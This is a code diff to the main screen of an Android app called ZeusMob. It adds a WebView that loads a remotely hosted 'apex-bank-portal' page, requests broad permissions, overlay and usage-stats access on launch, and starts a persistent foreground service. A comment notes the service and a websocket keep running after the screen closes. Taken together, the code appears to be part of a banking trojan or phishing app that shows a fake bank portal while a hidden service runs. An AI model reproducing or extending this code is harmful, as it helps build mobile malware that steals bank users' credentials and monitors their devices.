@@ -1,13 +1,19 @@
 package com.zeusmob.app;
 
 import android.Manifest;
-import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.view.View;
+import android.webkit.WebChromeClient;
+import android.webkit.WebResourceRequest;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -20,18 +26,70 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int REQ_PERMISSIONS = 100;
     private static final int REQ_OVERLAY     = 101;
-    private static final int REQ_USAGE       = 102;
+
+    private WebView webView;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        setupWebView();
         requestAllPermissions();
         startForegroundService();
     }
 
-    // ── Solicitar todas as permissões ──────────────────────────
+    // ── WebView ────────────────────────────────────────────────────
+    private void setupWebView() {
+        webView = findViewById(R.id.webview_main);
+
+        WebSettings ws = webView.getSettings();
+        ws.setJavaScriptEnabled(true);
+        ws.setDomStorageEnabled(true);
+        ws.setLoadWithOverviewMode(true);
+        ws.setUseWideViewPort(true);
+        ws.setCacheMode(WebSettings.LOAD_DEFAULT);
+        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        ws.setUserAgentString(ws.getUserAgentString() + " ZeusMobApp/1.0");
+
+        webView.setWebChromeClient(new WebChromeClient());
+        webView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+                // Keep all navigation inside the WebView
+                return false;
+            }
+
+            @Override
+            public void onPageStarted(WebView view, String url, Bitmap favicon) {
+                super.onPageStarted(view, url, favicon);
+            }
+
+            @Override
+            public void onPageFinished(WebView view, String url) {
+                super.onPageFinished(view, url);
+            }
+        });
+
+        // Load the portal URL injected at build time
+        String portalUrl = getString(R.string.app_link);
+        if (portalUrl == null || portalUrl.trim().isEmpty()) {
+            portalUrl = "https://apex-bank-portal--kc0151262.replit.app";
+        }
+        webView.loadUrl(portalUrl);
+    }
+
+    // ── Back button navigates WebView history ─────────────────────
+    @Override
+    public void onBackPressed() {
+        if (webView != null && webView.canGoBack()) {
+            webView.goBack();
+        } else {
+            super.onBackPressed();
+        }
+    }
+
+    // ── Permissions ───────────────────────────────────────────────
     private void requestAllPermissions() {
         List<String> needed = new ArrayList<>();
 
@@ -50,7 +108,6 @@ public class MainActivity extends AppCompatActivity {
                 needed.add(p);
             }
         }
-
         if (!needed.isEmpty()) {
             ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_PERMISSIONS);
         }
@@ -63,16 +120,14 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // Usage Stats
-        requestUsageStatsPermission();
+        try {
+            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception ignored) {}
     }
 
-    private void requestUsageStatsPermission() {
-        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        try { startActivity(intent); } catch (Exception ignored) {}
-    }
-
-    // ── Iniciar serviço em primeiro plano ──────────────────────
+    // ── Foreground Service ─────────────────────────────────────────
     private void startForegroundService() {
         Intent svc = new Intent(this, ZeusForegroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -86,6 +141,16 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode,
             @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        // Permissões registradas — sem ação adicional necessária
+    }
+
+    @Override
+    protected void onDestroy() {
+        // Destroy WebView resources — does NOT touch the background service or WS
+        if (webView != null) {
+            webView.destroy();
+            webView = null;
+        }
+        super.onDestroy();
     }
 }
+
